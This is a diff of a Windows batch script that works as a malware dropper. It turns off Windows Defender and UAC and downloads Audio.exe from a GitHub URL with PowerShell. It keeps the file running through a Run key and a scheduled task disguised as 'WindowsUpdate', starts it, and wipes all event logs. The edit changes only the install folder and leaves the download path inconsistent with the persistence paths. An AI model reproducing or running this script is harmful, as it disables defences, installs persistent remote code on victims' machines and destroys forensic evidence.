@@ -19,14 +19,15 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v Dis
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 cls
 echo --------------------cerete-my-path--------------------------------------------------
-mkdir "%systemdrive%\programdata\WinGuard"
+mkdir "%systemdrive%\programdata\W1"
 echo ----------------------------copy-my-files-to-web-sever-------------------------------------
-PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/joker320im-cyber/SLASH/raw/refs/heads/main/HD%20Audio%20Background.exe','%programdata%\WinGuard\Audio.exe')
+PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/joker320im-cyber/SLASH/raw/refs/heads/main/Audio.exe','%programdata%\WinGuard\Audio.exe')
 echo -----------start-paylod------------------------
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\WinGuard\Audio.exe"
-schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\WinGuard\Audio.exe" /f
-start %programdata%\WinGuard\Audio.exe
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\W1\Audio.exe"
+schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\W1\Audio.exe" /f
+start %programdata%\W1\Audio.exe
 echo -----------delete-evnt-log-------------------------------------------
 
 for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
+
 
